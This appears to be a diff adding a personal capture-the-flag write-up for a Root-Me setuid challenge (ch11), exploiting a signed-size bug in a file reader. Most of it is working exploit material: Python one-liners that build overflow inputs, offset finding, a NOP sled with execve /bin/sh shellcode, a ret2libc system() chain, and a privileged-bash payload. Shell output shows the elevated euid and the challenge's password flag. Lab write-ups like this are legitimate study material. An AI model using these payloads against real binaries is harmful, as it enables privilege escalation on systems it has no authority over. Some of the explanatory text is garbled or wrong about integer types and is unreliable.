@@ -1,0 +1,175 @@
+by freshnuts
+============
+Bug:
+
+void read_data(char *data, int fd, int size)
+{
+  while(read(fd, data, 1) == 1 && *data && size)
+    {
+      size--;
+      data++;
+    }
+}
+
+
+
+Process:
+1. integer overflow happens when the max amount of bytes are overflowed or
+	underflowed. If we overflow 'int size' '0xff ff ff ff',
+that was meant for a buffer we can allocate the size due to an ovef
+
+0xffffffff = -1
+
+
+      char: -128 – 127
+      unsigned char: 0 – 255
+      int16_t: -32768 – 32767
+      uint16_t: 0 – 65535
+  	  int32_t: -2147483648 – 2147483647
+=>    uint32_t: 0 – 4294967295
+      int64_t: -9223372036854775808 – 9223372036854775807
+      uint64_t: 0 – 18446744073709551615
+
+
+// by default int is 4 bytes unsigned.
+// unsigned number cannot go below 0.
+int size;
+
+  if(read(fd, &size, sizeof(int)) != sizeof(int))	// read size 4 bytes
+    {
+      printf("[-] File too short.\n");
+      exit(0);
+    }
+
+
+// python -c 'print "\xff" * 4 ' > x6
+// 0xffffffff = -1
+// Notice at below @ breakpoint 1, size=-1. We underflowed the unsigned int.
+
+pwndbg> r x6
+Starting program: /root/lab/ch11_rootme/ch11 x6
+
+Breakpoint 1, read_data (data=0xffffd27f "", fd=3, size=-1)
+
+
+
+// size = -1, we bypass this if().
+
+  if(size >= BUFFER)
+    {
+      printf("[-] Path too long.\n");
+      exit(0);
+
+
+// read_data()
+// size is essentially broken. We can overflow its original defined size,
+	128 bytes.
+# python -c 'print "\xff" * 4 + "/" + "A" * 200'> x6
+
+ ► 0x804865a  <read_file+293>    ret    <0x41414141>
+
+
+
+# python -c 'print "\xff" * 4 + "/" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"'> x6
+
+ ► 0x804865a  <read_file+293>    ret    <0x37654136>
+[*] Exact match at offset 140
+
+
+# python -c 'print "\xff" * 4 + "/" + "A" * 140 + "B" * 4'> x6
+
+ ► 0x804865a  <read_file+293>    ret    <0x42424242>
+
+
+
+# python -c 'print "\xff" * 4 + "/" + "\x41" * 110 + "C" * 30 + "\xbb\xb1\x04\x08"'> x6
+
+pwndbg> search "AAAA"
+[...]
+[heap]          0x804b1bb 0x41414141 ('AAAA')	<= ret2nop
+[heap]          0x804b1bf 0x41414141 ('AAAA')
+[heap]          0x804b1c3 0x41414141 ('AAAA')
+[heap]          0x804b1c7 0x41414141 ('AAAA')
+[heap]          0x804b1cb 0x41414141 ('AAAA')
+[heap]          0x804b1cf 0x41414141 ('AAAA')
+[heap]          0x804b1d3 0x41414141 ('AAAA')
+[heap]          0x804b1d7 0x41414141 ('AAAA')
+[heap]          0x804b1db 0x41414141 ('AAAA')
+[heap]          0x804b1df 0x41414141 ('AAAA')
+[stack]         0xffffd280 0x41414141 ('AAAA')
+[stack]         0xffffd284 0x41414141 ('AAAA')
+[stack]         0xffffd288 0x41414141 ('AAAA')
+[stack]         0xffffd28c 0x41414141 ('AAAA')
+[stack]         0xffffd290 0x41414141 ('AAAA')
+[stack]         0xffffd294 0x41414141 ('AAAA')
+[stack]         0xffffd298 0x41414141 ('AAAA')
+[stack]         0xffffd29c 0x41414141 ('AAAA')
+[...]
+
+
+# python -c 'print "\xff" * 4 + "/" + "\x90" * 110 + "C" * 30 + "\xbb\xb1\x04\x08"'> x6
+
+ EAX  0xa9
+ EBX  0x43434343 ('CCCC')
+ ECX  0x0
+ EDX  0xf7f9c890 ◂— 0
+ EDI  0x43434343 ('CCCC')
+ ESI  0xf7f9b000 ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
+ EBP  0x43434343 ('CCCC')
+ ESP  0xffffd30c —▸ 0x804b1bb ◂— 0x90909090
+ EIP  0x804865a (read_file+293) ◂— ret    
+ 
+► 0x804865a  <read_file+293>    ret    <0x804b1bb>
+    ↓
+   0x804b1bb                     nop    
+   0x804b1bc                     nop    
+   0x804b1bd                     nop    
+   0x804b1be                     nop    
+   0x804b1bf                     nop    
+───────────────────────────────────────[ STACK ]───────────────────────────────
+00:0000│ esp  0xffffd30c —▸ 0x804b1bb ◂— 0x90909090
+
+
+
+Local:
+python -c 'print "\xff" * 4 + "/" + "\x90" * (140-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xbb\xb1\x04\x08"' > x6
+
+► 0x804b1fc    int    0x80 <SYS_execve>
+        path: 0xffffd304 ◂— '/bin//sh'
+        argv: 0x0
+        envp: 0x0
+
+process 23375 is executing new program: /bin/dash
+
+
+
+
+
+Local: (No shellcode)
+ pop rbx
+ '/bin/bash'
+ system()
+ exit();
+
+python -c 'print "\xff" * 4 + "/" + "\x90" * 140 + "\x9c\x83\x04\x08" + "\xa4\xd5\xff\xff" + "\x40\xeb\xdf\xf7" + "\x40\x1b\xdf\xf7"' > x6
+
+
+
+
+============================================================================
+remote Payload:
+
+#/bin/bash - privileged shell - 28 bytes
+python -c 'print "\xff" * 4 + "/" + "\x90" * (156-33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x80\xb1\x04\x08"' > x11
+
+
+app-systeme-ch11@challenge02:~$ ./ch11 /tmp/x11
+[+] The pathname is : /j
+                        XRfh-pjhh/bash/binQS
+
+bash-4.4$ id
+uid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11-cracked) groups=1111(app-systeme-ch11),100(users)
+bash-4.4$ cat .passwd
+8&1-|(5g8q!=
+bash-4.4$
+============================================================================
